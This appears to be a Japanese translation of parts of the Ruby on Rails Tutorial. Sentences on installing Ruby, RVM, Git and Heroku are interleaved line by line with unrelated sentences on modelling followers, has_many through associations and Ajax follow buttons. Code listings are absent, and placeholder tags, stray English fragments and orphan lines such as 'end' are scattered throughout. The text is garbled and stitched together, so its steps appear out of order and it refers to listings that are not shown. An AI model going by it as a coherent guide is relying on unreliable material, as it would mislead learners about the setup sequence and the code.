Windowsユーザーの方は\href{http://railsinstaller.org/}{Railsインストーラ}からインストーラをダウンロードしてください。
今度は\emph{逆の}関係を考えます。\kode{follower_id}カラムを使用して、ユーザーのフォロワーの配列を取り出すことができます。
ユーザーの\kode{followed_users}の配列を作成するには、\kode{followed_id}の配列を取り出し、それぞれのidごとに対応するユーザーを見つけ出します。
この問題を解決するために、Railsのバージョン番号順に並んだRubyインストーラのリストを作成してもらうようNicとWayneに働きかけています。
皆様の期待どおり、Railsにはこのような手続きを簡単に行うための方法があります。多対多の関係を表現するこの手法は\kode{has_many through}として知られています。
Gitのインストール
Gitは本書で多用されているので、早い内にインストールを済ませておきます。\href{http://www.git-scm.com/book/en/Getting-Started-Installing-Git}{\emph{Pro Git}の「Gitのインストール」}でプラットフォーム毎の解説を行っているので参考にしてください。
このコードは自動的に、\kode{user.followed_users}を「フォローしているユーザー」の配列を使用して展開します。
(ここでいくつか警告メッセージが表示されることがありますが、無視しても構いません。)
Rubyのインストール
最後に、リモートサーバーでSSLを設定します。
次にRubyをインストールします。
本番WebサイトでSSLを使用するように設定を行うのはかなり面倒で、間違いも起きやすくなっています。また、使用する独自ドメイン向けの\emph{SSL証明書}も購入しなければなりません。
(Rubyのインストールは面倒が多く、エラーもよく発生します。正直、新しいバージョンのRubyをインストールするのが怖いのですが、仕事を進める上では避けて通れません)。
場合によっては、既に自分のシステムにRubyがインストール済みであることもありえます。
幸い、このサンプルアプリケーションのようにHerokuドメインのまま使用してもよいのであれば、HerokuのSSL証明書を流用することができます。これはHerokuプラットフォームの一部として自動的に利用できる機能です。
以下を実行して、
SSLを\kode{example.com}のような独自ドメインで実行したいのであれば、SSL証明書を購入するしかありません。詳細は\href{http://devcenter.heroku.com/articles/ssl}{HerokuのSSL関連ページ}を参照してください。
バージョン情報を確認してください。
(Rails 4はRuby 1.8.7では動作しません)。
これで、好きなだけユーザー登録ページを表示して新規ユーザーを作成できるようになりました。
本書では、Ruby 1.9.3または2.0.0を前提としますが、Ruby 1.9.2でも動作するはずです。
何か問題が生じた場合は、以下を実行して
{0}図11.7{/0}{1}ユーザーのリレーションシップで表される、フォローしている/されているユーザーのモデル。{/1}
OS X、またはLinuxを使う場合、\href{http://rvm.io/}{Ruby Version Manager (RVM)} または\href{https://github.com/sstephenson/rbenv}{rbenv}を使用してRubyをインストールすることを強くお勧めします。RVMを使うと、複数のRubyバージョンを共存させられるのでとても便利です
このデータモデルを実装するには、最初に以下のようにRelationshipモデルを生成します。
(Windows上で動作する同様のソフトに\href{http://github.com/vertiginous/pik}{Pik}があります。)
同じマシン上で異なるバージョンのRubyやRailsを実行したい場合、これは特に重要です。
上のコマンドを実行するとRelationshipファクトリーも生成されるので、以下を実行してファクトリーを削除してください。
残念ながら、RVMとrbenvは共存できませんので注意してください。著者は本書でRVMを使い続けているので、今回もRVMを使用します。
IRCが初めてであれば、まず “irc client <あなたのプラットフォーム>”で検索することをお勧めします。
OS X用のネイティブクライアントとしては\href{http://colloquy.info/}{Colloquy}と\href{http://limechat.net/mac/}{LimeChat}がお勧めです。
Mac OS Xユーザーの場合、Xcodeという開発ツールのインストールが必要なことがあります。
Xcodeはサイズが大きいので、それよりもずっとサイズの小さい\href{https://developer.apple.com/downloads/}{Command Line Tools for Xcode}をお勧めします
Rubyをインストールする前に、以下を実行して\href{http://rvm.io/rvm/install/}{RVM}をインストールします。
(RVMがインストール済みの場合、以下を実行して
最新のRVMを使用するようにしてください)。
RVMをインストール後、以下を実行してRubyインストールのための要件を調べます。
著者の場合、以下をインストールする必要がありました (ここでは\href{http://mxcl.github.com/homebrew/}{Homebrew}というMac OS X用のパッケージ管理システムを使用しています)。
Linuxの場合、\kode{apt-get}または\kode{yum}を使用して同様にインストールできます。
著者の場合、\href{https://en.wikipedia.org/wiki/YAML}{YAML}ライブラリのインストールも必要でした。
どのくらい細かくテストするかはお任せします。リスト\ref{code:flash_test}にテンプレートを用意しておいたので、参考にしてください。
最後に以下を実行してRuby 2.0.0をインストールします。ここではOpenSSLの場所をRVMに知らせるオプションを追加してあります。
<しばらく待つ>
これはリスト\ref{code:relationship_create_test}で使用されていました。
リレーションシップの作成と属性をテストする。
残念ながら、RubyやRVMのインストール中に問題が生じることがよくあります。
詳細については、Stack Overflowの「\href{http://stackoverflow.com/questions/5359558/when-to-use-rspec-let}{どんなときにletを使用すべきか} (英語)」を参照してください。
本書ではなるべく問題が生じにくいような手順を記載しましたが、すべてをカバーすることはできません。問題が生じたらネットを検索するのが早道です。
これまで通常のインスタンス変数を使用してきたのは、インスタンス変数を早い段階で紹介しておきたかったのと、\kode{let}がやや高度であるためです。
Rubyをインストールしたら、Railsのアプリケーションを実行するために必要な他のソフトウェア向けにシステムを構成する必要があります。
selfを省略した結果をリスト\ref{code:user_relationships_method_test}に示します。
通常、これは\emph{gem}のインストールに関連します。gemとは自己完結型のRubyコードのパッケージです。
\kode{user.relationships}属性のテスト。
バージョン番号の異なるgem同士がコンフリクトすることがあるため、一連のgemを自己完結的にまとめた\emph{gemset}というものを作成してバージョンを使い分けるのが便利です。
本書向けに、以下を実行して\kode{railstutorial_rails_4_0}という名前のgemsetを作成しておくことをお勧めします。
Using /Users/mhartl/.rvm/gems/ruby-2.0.0-p0 with gemset railstutorial_rails_4_0
(なお、\kode{underscore}と逆の働きをする\kode{camelize}というメソッドもあります。これは\kode{"camel_case"}を\kode{"CamelCase"}のように変換します) 。
selfを省略した結果をリスト\ref{code:user_relationships_association}に示します。
RVMの詳細については、「\href{http://strandcode.com/2013/07/11/ruby-version-manager-rvm-overview-for-rails-newbs/}{Rails初心者のためのRuby Version Manager (RVM) の概要} (英語)」という記事を参考にしてください
\kode{followed_id}でもユーザーを特定できることに気付き、フォローしているユーザーとフォロワーの扱いが対称的でないことをよく考えてみれば、もうゲームに勝ったようなものです。
RubyGemsのインストール
ユーザー/リレーションシップの\kode{has_many}の関連付けを実装する。
RubyGemsはRubyのプロジェクトのためのパッケージマネージャであり、Rubyのパッケージ (\emph{gem}) として利用できる多くの有用なライブラリがあります。Railsもgemとしてインストールします。
Rubyがインストールされていれば、RubyGemsは簡単にインストールできます。
これはリスト\ref{code:relationships_belongs_to_test}で使用されていました。
\href{http://rvm.io/rvm/install/}{RVMをインストール}してあれば、既にRubyGemsも同時にインストールされているはずです。
RubyGemsがインストールされていない場合は、\href{http://rubygems.org/pages/download}{RubyGemsをダウンロード}して解凍し、作成された\kode{rubygems}ディレクトリでセットアッププログラムを実行してください。
ユーザー/リレーションシップの\kode{belongs_to}関連付けをテストする。
既にRubyGemsがインストールされている場合は、システムをチュートリアルで使われているバージョンに更新してください。
これに対応するアプリケーションコードを作成するには、\kode{belongs_to}リレーションシップを普段と同様に作成します。
Railsは外部キーを、それに対応するシンボルから推測します。たとえば、\kode{:follower}から\kode{follower_id}を推測し、\kode{:followed}から\kode{followed_id}を推測するという具合です。しかし、FollowedモデルもFollowerモデルも実際にはないので、クラス名\kode{User}を提供する必要があります。
システムを特定のバージョンに固定しておけば、今後RubyGemsが変更されたときのコンフリクトを防止できます。
変更の結果をリスト\ref{code:relationship_belongs_to}に示します。
gemをインストールすると、RubyGemsによってriとrdocという2種類のドキュメントがデフォルトで作成されます。多くのRubyやRailsの開発者はこれらのドキュメントが自動生成される時間すら惜しいと考えます
デフォルトで作成されるRelationshipモデルとは異なり、\kode{followed_id}のみアクセス可能となっている点に注意してください。
(ほとんどのプログラマーはネイティブのriやrdocなど参照せず、さっさとオンラインドキュメントを見に行ってしまいます)。
\kode{belongs_to}関連付けを Relationshipモデルに追加する。
これはリスト\ref{code:gemrc}で使用されていました。
このコードはリスト\ref{code:relationship_create_test}で使用されていました。もうひとつ、
gem設定ファイルを作成する。
冒頭の\kode{subl}はOS XでSublime Textを起動するコマンドです。設定方法については「\href{http://www.sublimetext.com/docs/2/osx_command_line.html}{OS X コマンドライン用Sublime Text 2ドキュメント} (英語)」を参照してください。
使用しているプラットフォームやエディタが異なる場合、sublを他のエディタコマンドに読み替えてください (エディタのアイコンをダブルクリックするか、\kode{mate}、\kode{vim}、\kode{gvim}、\kode{mvim}などのコマンドに差し替えます)。
記述を簡素化するため、本書で以後\kode{subl}と書かれている箇所はお好みのエディタに読み替えてください。
\kode{.gemrc}にriとrdoc生成を抑制するコマンドを追加する。
RubyGemsをインストールしてしまえば、Railsのインストールは簡単です。
いよいよRelationship関連付けの核心、\kode{followed_users}と\kode{followers}に取りかかります。
本書ではRails 4.0を使用します。以下を実行してインストールしてください。
selfを省略した結果をリスト\ref{code:user_following_test}に示します。
正しくインストールされたかどうかを確認するには、以下のコマンドを実行してバージョンを確認してください。
\kode{user.followed_users}属性のテスト。
この記事の執筆時点では、このバージョンの違いは影響していません。ただし、今後Railsのバージョンが本書指定のものから離れていくにつれ、バージョンの違いによる影響が顕著になる可能性があります。
Linuxを実行している場合は、この時点で、他にもいくつかのパッケージをインストールする必要が生じる場合があります。
デフォルトの\kode{has_many through}関連付けでは、Railsは単一バージョンの関連付けに対応する外部キーを探します。つまり以下のコードは
\kode{relationships}テーブルの\kode{followed_id}を使用して配列を作成します。
どんなRailsアプリケーションも最初の作成手順は同じです。\kode{rails new}コマンドを実行して作成します。
Userモデルの\kode{followed_users}関連付けを追加する。
\kode{rails new}を実行してアプリケーションを新規作成する。
(この\kode{follow!}メソッドは常に正常に動作しなければなりません。従って、\kode{create!}メソッドや\kode{save!}メソッドと同様、末尾に感嘆符を置いて、作成に失敗した場合には例外を発生することを示します) 。
このアプリケーションコードでは、\kode{following?}メソッドは\kode{other_user}という1人のユーザーを引数にとり、フォローする相手のユーザーがデータベース上に存在するかどうかをチェックします。\kode{follow!}メソッドは、\kode{relationships}関連付けを経由して\kode{create!}を呼び出すことで、「フォローする」のリレーションシップを作成します。
変更の結果をリスト\ref{code:following_p_follow_bang}に示します。
以下は、上と同等のコードです。
\kode{self}を明示的に書くかどうかは好みの問題です。
ユーザーは他のユーザーをフォローできるだけでなく、フォロー解除もできる必要があります。Of course, users should be able to unfollow other users as well as follow them, which leads to the somewhat predictable \kode{unfollow!}
Use `bundle show [gemname]` to see where a bundled gem is installed.
selfを省略した結果をリスト\ref{code:user_unfollow_test}に示します。
ユーザーのフォロー解除をテストする。
ユーザーのリレーションシップを削除してフォロー解除する。
リレーションシップというパズルの最後の一片は、\kode{user.followers}メソッドを追加することです。これは上の\kode{user.followed_users}メソッドと対になります。
実は、\kode{follower_id}と\kode{followed_id}を入れ替えるだけで、フォロワーについてもユーザーのフォローのときとまったく同じ方法が使用できます。
{0}図11.9{/0}{1}Relationshipモデルのカラムを入れ替えて作った、フォロワーのモデル。{/1}
逆リレーションシップをテストする。
\ref{sec:the_first_application}でも簡単に説明したように、Bundlerは\kode{rails}によって自動的に実行 (この場合は\kode{bundle install}) されます。ここではデフォルトのアプリケーションgemを変更してBundlerを再度実行してみます。
\kode{subject}メソッドを使用して\kode{@user}から\kode{other_user}に対象を切り替えていることで、フォロワーのリレーションシップのテストを自然に実行できていることに注目してください。
そのためにまず、好みのエディタで\kode{Gemfile}を開きます。
もちろん、逆リレーションシップのためにわざわざデータベーステーブルを1つ余分に作成するようなことはしません。
代わりに、フォロワーとフォローしているユーザーの関係が対称的であることを利用し、単に\kode{followed_id}を主キーとして渡すことで\kode{reverse_relationships}をシミュレートすればよいのです。
\kode{first_app}ディレクトリ直下にあるデフォルトの\kode{Gemfile}。
つまり、この\kode{relationships}関連付けでは以下のように\kode{follower_id}を外部キーとして使用し、
\kode{reverse_relationships}では以下のように\kode{followed_id}を外部キーとして使用します。
selfを省略した結果をリスト\ref{code:user_reverse_relationships}に示します。
逆リレーションシップを使用して\kode{user.followers}を実装する。
実際には、この関連付けでは以下のように\emph{クラス}名を明示的に含める必要があることに注意してください。
これを指定しないと、Railsは実在しない\kode{ReverseRelationship}クラスを探しに行ってしまいます。
ここでは、以下のように\kode{:source}キーを省略してもよいことにも注意してください。
\kode{:followers}属性の場合、Railsが “followers” を単数形にして自動的に外部キー\kode{follower_id}を探してくれるからです (:followedではこうはいきません)。
上のコードでは、関連付けが\kode{has_many :followed_users}と同じ形式になることを強調するために、あえて\kode{:source}キーを付けてありますが、もちろん省略しても構いません。
この節は、データモデリングのスキルを向上させるという強い要請に基いて書かれました。時間をかけて身に付けていただければ幸いです。
この節で使用されたさまざまな関連付けを理解するのに一番良いのは、次の節で行なっているように実際のWebインターフェイスで使用することです。
# gem 'capistrano', group: :development
\kode{gem} コマンドで特定のバージョン番号を指定しない限り、Bundlerは自動的に最新バージョンのgemを取得してインストールしてくれます。
1つ前の章のときと同じように、サンプルデータを自動作成するRakeタスクを使用してデータベースにサンプルリレーションシップを登録するのがやはり便利です。
(2.0.0以外のバージョンのRubyを使用する場合は、Rubyのバージョンを書き換えてください)。
更新された\kode{Gemfile}では、JQueryに関する以下の行も変更します。JQueryはRailsのデフォルトのJavaScriptライブラリです。
他にも変更を行います。
make_users
make_microposts
make_relationships
この手順が必要となるのは、Rails gemのバージョンを変更した場合に限られます。おそらくRailsインストーラを使用している場合にしかこういうことは起こらないでしょう。他の場合にこの手順を実行しても大丈夫です。
上のコードのうち、サンプルリレーションシップを作成する部分は以下です。
ここでは、最初のユーザーにユーザー3からユーザー51までをフォローさせ、それから逆にユーザー4からユーザー41に最初のユーザーをフォローさせます。ソースを見るとわかるように、このような設定を自由に行うことができます。
{p0}の{2}rails new{/2}コマンドと\ref{sec:the_first_application}の{2}bundle install{/2}コマンドを実行したことにより、実際に動かすことのできるアプリケーションが作成されました。
うれしいことに、Railsには開発マシンからのみブラウズできる\emph{ローカル}Webサーバを起動させるためのコマンドラインプログラム (\emph{スクリプト}) が付属しているので、以下のコマンドを実行するだけで簡単に起動することができます
これでサンプルユーザーに、フォローしているユーザーの配列とフォロワーの配列ができました。ユーザープロファイルページとHomeページを更新してこれを反映しましょう。
=> Call with -d to detach
次に、フォロー用とフォロー解除用のフォームを作成します。それから、フォローしているユーザーとフォロワーの一覧を表示する専用のページを作成します。
(JavaScriptランタイムがインストールされていないというエラーが表示された場合は、\href{https://github.com/sstephenson/execjs}{GitHubのexecjsページ}にあるインストール可能なランタイムを確認してください。
\href{http://nodejs.org/}{Node.js}が特にお勧めです。)
通常、Webサイトは80番ポートで受信待ちしますが、このポートを使用するには特別な権限が必要になることが多いので、Railsの開発用サーバーでは制限の少ない、番号の大きいポート (いわゆるハイナンバーポート) を使用します。
このIPアドレスは、このマシンに設定されているすべてのIPアドレスで受信待ち (listen) するように指定しています。これにより、\kode{127.0.0.1}(\kode{localhost})という特別なアドレスでアプリケーションをブラウズできます。
この最初のアプリケーションの情報を見るには、「About your application’s environment」のリンクをクリックしてください。
テストの結果を図\ref{fig:riding_rails_environment}に示します。
どちらのページもデータを表示するものなので、(RESTの慣習に基いて) \kode{GET}リクエストに応答するために\texttt{get}を使用してURLを生成します。\texttt{member}メソッドは、ユーザーidを含むURLにそのルート (route) が応答できるようにするものです。
\ref{sec:rails_routes}ではこのデフォルトページを削除し、カスタマイズしたホームページに置き換える予定です。
ルーティングが定義されたことで、統計情報パーシャルをテストできる状態になりました
新しく動作するRailsアプリが完成したところで、さっそくアプリケーションのソースコードを\emph{バージョン管理}下に置きましょう。これを行わないとアプリケーションが動かないということではありませんが、ほとんどのRails開発者はバージョン管理は開発現場において必要不可欠であると考えています。
(最初にテストを書いてもよかったのですが、ルーティングを更新しておかないと名前付きルートの説明がしにくかったので、テストを後にしました) 。
Homeページ上の、フォローしているユーザー/フォロワーの統計情報をテストする。
バージョン管理システムを熟知することは、今やあらゆるソフトウェア開発者にとって必須のスキルであると言ってよいでしょう。
Git (というよりバージョン管理) はそれだけで大きなテーマなので、すべてを説明しようとすると軽く一冊の本を超えてしまいます。本書では簡単に言及するにとどめますが、幸いネット上には無償で利用できるリソースがあふれています。その中でも特に「\href{http://git-scm.com/book}{\emph{Pro Git}}」Scott Chacon (Apress, 2009) をお勧めいたします (訳注: Pro Gitには素晴らしい日本語版があります: http://git-scm.com/book/ja/ )。
  end
(リンク先の節でも述べているように、\href{http://git-scm.com/book/en/getting-started-installing-git}{\emph{Pro Git}の「Gitのインストール}」の記載に従うことになります)。
Gitのインストール後、最初に1回だけ行う必要のある設定があります。
このテストの中心となるのは、フォローしているユーザーとフォロワーのカウントがページに表示され、それぞれに正しいURLが設定されていることを確認することです。
著者の場合、\kode{checkout} という長ったらしいコマンドの代わりに\kode{co}という短いコマンド (エイリアス) も使えるようにしています。これを行うには以下を実行します。
本書では、\kode{co}エイリアスを設定していないシステムでも動作するようにフルスペルの\kode{checkout}を使用していますが、著者自身は実際の開発ではほとんどいつも\kode{git co}を使ってプロジェクトをチェックアウトしています。
また、ここでは “followers” という語は\emph{ラベル}として使用しているので、フォロワーが1人の場合にも複数形のままとします。
selfを省略した結果をリスト\ref{code:stats_partial}に示します。
今度は、\emph{リポジトリ}を作成するたびに必要な作業を行います。
Initialized empty Git repository in /Users/mhartl/rails_projects/first_app/.git/
次に、プロジェクトのファイルをリポジトリに追加します。
実行結果を図\ref{fig:home_page_follow_stats}に示します。
このコマンドにより、プロジェクトのファイルは、コミット待ちの変更が格納されている「\emph{ステージングエリア}」という一種の待機場所に追加されます。ステージングエリアにあるファイルのリストを表示するには、\kode{status}コマンドを実行します
{0}図11.11{/0}{1}Homeページ (\href{http://localhost:3000/}{/}) にフォロー関連の統計情報を表示する。\href{http://railstutorial.org/images/figures/home_page_follow_stats_bootstrap-full.png}{(拡大)}{/1}
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
この点については、もう一つの有名なオープンソースバージョン管理システムであるSubversionとははっきり異なります。
Gitの場合、コミットを実行してもリモート上にあるリポジトリを直接変更することはありません。Gitでは、ローカルでの変更保存 (\kode{git commit}) と、リモート上のリポジトリへの変更反映 (\kode{git push}) の2段階に分かれています。
Date:   Thu Oct 15 11:36:21 2009 -0700
\kode{git log}を終了するには\kode{q}キーを押してください。
今の時点では、ソースコードをバージョン管理下に置かなければならない理由が今ひとつよくわからないという方がいるかもしれませんので、例を1つ紹介します
(この後の章でも多くの実例を紹介します)。
この「隠れた」\kode{input}タグは、関連する情報をページに置きながら、それらをブラウザ上で非表示にします。
仮に、あなたが重要な\kode{app/controllers/}ディレクトリを削除してしまったとしましょう。
ここでは、Unixコマンドの\kode{ls}で\kode{app/controllers/}ディレクトリの中身を表示した後、\kode{rm}コマンドをうっかり実行してこのディレクトリを削除してしまいました。
現在の状態を確認してみましょう。
つまり、以前のコミットを\kode{checkout}コマンド (と、現在までの変更を強制的に上書きして元に戻すための\kode{-f}フラグ) でチェックアウトすれば、簡単に削除前の状態に戻すことができます。
{0}図11.12{/0}{1}あるユーザープロファイル (\href{http://localhost:3000/users/2}{/users/2}) に [Follow] ボタンが表示されている。 \href{http://railstutorial.org/images/figures/profile_follow_button_bootstrap-full.png}{(拡大)}{/1}
削除されたディレクトリとファイルが無事復旧しました。
{0}図11.13{/0}{1}あるユーザープロファイル (\href{http://localhost:3000/users/8}{/users/6}) に [Unfollow] ボタンが表示されている。\href{http://railstutorial.org/images/figures/profile_unfollow_button_bootstrap-full.png}{(拡大)}{/1}
Gitを使用してプロジェクトをバージョン管理下に置くことができたので、今度は\href{http://github.com}{GitHub}にソースコードをアップロードしてみましょう。GitHubは、Gitリポジトリの置き場所を提供したり (ホスティング)、リポジトリを開発者同士で共有するサービスを提供したりするWebサービスとして有名です。
フォローしているユーザーを表示するページと、フォロワーを表示するページは、いずれもユーザープロファイルページとユーザーインデックスページ (\ref{sec:user_index}) を合わせたような作りになるという点で似ています。どちらにもフォローの統計情報などのユーザー情報を表示するサイドバーと、ユーザーのリストがあります。
リポジトリをGitHubにわざわざプッシュするのには2つの理由があります。１つ目は、ソースコード (とそのすべての変更履歴) の完全なバックアップを作成することです。２つ目は、他の開発者との共同作業をより簡単に行うことです。
さらに、サイドバーにはユーザープロファイル画像のリンクを格子状に並べて表示する予定です。
GitHubへのプッシュは必須ではありませんが、GitHubのメンバーになっておくと、多くのオープンソースプロジェクトに参加できるようになります。
GitHubにはさまざまな有料プランがありますが、オープンソースのコードなら無料で利用できるので、初めて利用するのであれば\href{https://github.com/signup/free}{無料のGitHubアカウント}を作成しましょう
{0}図11.14{/0}{1}フォローしているユーザー用ページのモックアップ。\href{http://railstutorial.org/images/figures/following_mockup_bootstrap-full.png}{(拡大)}{/1}
(念のため、\href{http://help.github.com/key-setup-redirect}{GitHubのSSHキー作成方法のチュートリアル}を先に読んでおいてください)。
{0}図11.15{/0}{1}ユーザーのフォロワー用ページのモックアップ。\href{http://railstutorial.org/images/figures/followers_mockup_bootstrap-full.png}{(拡大)}{/1}
(注意: このときに\emph{README}ファイルを使用してリポジトリを初期化\kode{しないでください} 。\emph{rails new}コマンドを実行するときにこれらのファイルは自動的に作成されるからです) 。
リポジトリを作成したら、以下を実行してアプリケーションをプッシュします。
これはリスト\ref{code:following_followers_authorization_test}で使用されていました。
最初のコマンドは、現在のメイン (\emph{master}) ブランチ用の "origin" としてGitHubに追加します。次のコマンドで実際に GitHubにプッシュします
（\texttt{-u}フラグについては気にする必要はありません。気になるのであれば "git set upstream"で検索してみてください）。
.
なお、GitHubにはコマンドラインインターフェイスを拡張したGUIアプリケーションもあります。 GUIアプリケーションの方が好みであれば、\href{http://windows.github.com/}{GitHub for Windows}や\href{http://mac.github.com/}{GitHub for Mac}をチェックしてみてください
 (Linux用のGitHubは今のところGitしかないようです)。
Sign in
\kode{README}ファイルの拡張子は\kode{.rdoc}になっているので、GitHubでは適切なフォーマットで表示されます。しかしその内容はRailsフレームワークそのものに関するもので、そのままでは役に立ちません。この節ではREADMEの内容を編集し、プロジェクトに関する記述に置き換えます。
\kode{followed_users}ページと\kode{followers}ページをテストする。
それぞれのアクションでは、タイトルを設定し、ユーザーを検索し、\kode{@user.followed_users}または\kode{@user.followers}からデータを取り出し、ページネーションを行なって、ページを出力する必要があります。
ちなみに、通常このような小さな変更のためにわざわざブランチを作成する必要はありませんが、ブランチがよい習慣であることに変わりはないので、少しでも練習しておきましょう。
著者の場合、デフォルトのRDocを編集するときには主に\href{http://daringfireball.net/projects/markdown/}{Markdown}というマークアップ言語を使用しています。拡張子を\kode{.md}にしておけば、GitHubにアップロードしたときに自動的にドキュメントがきれいに整形されます。
# Ruby on Rails チュートリアル：サンプルアプリケーション
This is the first application for the
by [Michael Hartl](http://michaelhartl.com/).
これらのアクションでは、\emph{render}を\kode{明示的に}呼び出していることに注意してください。ここでは、作成の必要な\emph{show_follow}というビューを出力しています。
\kode{-a}フラグは慎重に扱ってください。最後のコミット後に新しいファイルを追加した場合は、まず\kode{git add}を実行してバージョン管理下に置く必要があります。
コミットメッセージは\emph{現在形}で書くようにしましょう。
詳細についてはGitHubに投稿された「\href{https://github.com/blog/926-shiny-new-commit-styles}{最新のコミット方法} (英語)」を参照してください。
{0}図11.16{/0}{1}現在のユーザーにフォローされているユーザーを表示する。\href{http://railstutorial.org/images/figures/user_following_bootstrap-full.png}{(拡大)}{/1}
{0}図11.17{/0}{1}現在のユーザーのフォロワーを表示する。\href{http://railstutorial.org/images/figures/user_followers_bootstrap-full.png}{(拡大)}{/1}
これらのボタンのテストには、本書で扱ったさまざまなテスティングの技法が集約されています。このテストコードを読むのはよい練習になります。
この点についてはこの後でカバーします)。
このコードにおける\kode{have_xpath}メソッドの使用法に注目してください。 これは、\href{http://en.wikipedia.org/wiki/XPath}{XPath}を使用してHTML5を含むXMLドキュメントを自在にナビゲートすることのできる、極めて高度かつパワフルなテクニックです。
Web検索でXPathを使用する方法の詳細については\href{http://www.w3schools.com/xpath/xpath_syntax.asp}{XPath構文} (英語) を参照してください。
Follow/Unfollowボタンをテストする。
  end
\kode{README}ファイルの更新が終わったので、GitHubに変更をプッシュして結果を見てみましょう。
既に\ref{sec:github}で一度プッシュを行ったので、大抵のシステムでは\kode{git push}を実行するときに\kode{origin master}を省略できます。
この段階では空っぽのRailsアプリケーションしかありませんが、本番環境に展開してしまいましょう。
この実装を書くには、正しい動作をより深く理解する必要があります。フォローすることとフォロー解除することは、それぞれリレーションシップを\emph{作成}することと\emph{削除}することです。これはつまり、Relationshipsコントローラで\kode{create}アクションと\kode{destroy}を定義するということであり、このコントローラを作成する必要があります。
(これが上で述べたセキュリティホールです) 。
Relationshipsコントローラの認可をテストする。
Rubyのバージョンを明示的に指定した\kode{Gemfile}。
すぐ削除されるので事実上意味のないRelationshipオブジェクトをわざわざ作成することによるオーバーヘッドを回避するために、\kode{delete}テストでは名前付きルートにid \kode{1}をハードコードしてあります。
インストールの際には、\kode{bundle install}に特殊なフラグを追加します。
ユーザーがリダイレクトされた後で、アプリケーションがこのidでリレーションシップを取り出すので、このコードは動作します。
上のテストにパスするための以下のコントローラのコードは、驚くほど簡潔です。単に、フォローしているユーザーまたはこれからフォローするユーザーを取り出し、関連するユーティリティメソッドを使用してそれらをフォローまたはフォロー解除しているだけです。
上で追加したgemは本番環境のみで使用するためのものなので、このコマンドを今実行してもgemはローカルに追加されません。このコマンドを実行するのは、後の本番環境に備えて\kode{Gemfile.lock}を更新し、\texttt{pg} gemと\texttt{rails_12factor} gem、Rubyバージョンの指定を含めておく必要があるためです。
このすべてを実装した結果を、リスト\ref{code:relationships_controller}に示します。
最初に\href{http://api.heroku.com/signup}{Herokuのユーザー登録}を行います。アカウント作成後に完了通知メールが届いたら、\href{https://toolbelt.heroku.com/}{Heroku Toolbelt}を使用して必要なHerokuソフトウェアをインストールします
次にターミナルで以下の\kode{heroku}コマンドを実行します (実行前にターミナルの終了と再起動が必要なことがあります)。
これで、フォロー/フォロー解除の機能が完成しました。どのユーザーも、他のユーザーをフォローしたり、フォロー解除したりできます。サンプルアプリケーションを実際に動かしてみたり、以下のようにテストスイートを実行することで動作を確認できます。
つまり、ユーザーはプロファイルページを最初に表示し、それからユーザーをフォローし、その後すぐ元のページにリダイレクトされるという流れになります。
Created http://stormy-cloud-5881.herokuapp.com/ |
git@heroku.com:stormy-cloud-5881.herokuapp.com
\emph{Asynchronous (非同期の) JavaScript And XML}の<n>それぞれの頭文字をとっています。Ajaxはしばしば “AJAX” と大文字で書かれますが、\href{http://www.adaptivepath.com/ideas/essays/archives/000385.php}{Ajaxの起源となる記事}では一貫して “Ajax” となっています。
WebフォームにAjaxを採用するのは今や当たり前になりつつあるので、RailsでもAjaxを簡単に実装できるようになっています。
Railsアプリケーションを実際にHerokuに展開するには、まずGitを使用してHerokuにリポジトリをプッシュします。
\kode{heroku}コマンドに以下の引数を与えるだけで、正しいアドレスでブラウザが起動します。
残念ながら、Rails 4.0では技術的な理由により以下のエラーページが表示されます。Rails 4.0のデフォルトページはHerokuでは表示できません。
ERbによって実際に生成されるHTMLはそれほど重要ではありませんが、興味がある方のために、以下の核心部分をお見せします。
以前のRailsでは完全なJavaScriptコードを挿入していましたが、Rails 3からは、このようにHTMLプロパティを使用して簡単にJavaScriptを使用できます。これは、\href{http://railscasts.com/episodes/205-unobtrusive-javascript}{\emph{JavaScriptを前面に出すべからず}}という哲学に従っています。
これはリスト\ref{code:relationships_controller_spec_ajax}で使用されていました。
ここでは\kode{xhr}メソッド (“XmlHttpRequest” の略です) を使用してAjaxリクエストを発行しています。以前の、\kode{get}、\kode{post}、\kode{patch}、\kode{delete}メソッドを使用したテストと比べてみてください。
それから、Ajaxリクエストを受信したときに\kode{create}アクションと\kode{destroy}アクションが正常に動作することを確認します
(Ajaxを多用するアプリケーションを徹底的にテストしたい方は、\href{http://seleniumhq.org/}{Selenium}と\href{http://watir.com/}{Watir}を参照してみてください)。
RelationshipsコントローラがAjaxリクエストに応答することをテストする。
(実を言うと、この\href{http://railstutorial.org}{Ruby on RailsチュートリアルWebサイト}もHeroku上に置かれています。本チュートリアルをオンラインで読んでいるのであれば、まさにHerokuにホスティングされたWebサイトを見ているということになります)。
@railstutorialjp でRuby on Railsを学習中!
後はRailsを実際に勉強するだけです。
一緒に頑張りましょう。
ただし、どういうわけかこの場合\kode{xhr}メソッドを結合テストで使用することができないために、このコントローラでのテストを行なっています。
\kode{xhr}は先ほど登場したばかりですが、本書ではひとまずコードの文脈から以下のコードの動作を推測していただくようお願いします。
\kode{xhr}が取る引数は、関連するHTTPメソッドを指すシンボル、アクションを指すシンボル、またはコントローラ自身にある\kode{params}の内容を表すハッシュのいずれかです。
これまでの例と同様、\kode{expect}を使用してブロック内の操作をまとめ、関連するカウントを1増やしたり減らしたりするテストを行なっています。
このテストが暗に示しているように、実はこのアプリケーションコードがAjaxリクエストへの応答に使用する\kode{create}アクションと\kode{destroy}アクションは、通常のHTTP \texttt{POST}リクエストと\texttt{DELETE}リクエストに応答するのに使用されるのと同じものです。
これはリスト\ref{code:relationships_controller_ajax}で使用されていました。
このコードでは、リクエストの種類に応じたアクションを実行するために\kode{respond_to}を使用しています
(注意: ここで使用している\kode{respond_to}は、RSpecの例で使用している\kode{respond_to}とは別物です)。
この文法は少々変わっていて、混乱を招く可能性があるため、以下のコードの動作を理解するようにしてください。
上のコードでは、リクエストの種類に応じて、続く行の中から\emph{1つだけ}が実行されることに注意してください。
Ajaxリクエストを受信した場合は、Railsが自動的にアクションと同じ名前を持つ\emph{JavaScript組み込みRuby} (\kode{.js.erb}) ファイル (\kode{create.js.erb}や\kode{destroy.js.erb}など) を呼び出します。
ご想像のとおり、これらのファイルではJavaScriptと組み込みRuby (ERb) をミックスして現在のページに対するアクションを実行することができます。
jQueryライブラリにはDOM操作用の膨大なメソッドが提供されていますが、ここで使用するのはわずか2つです。
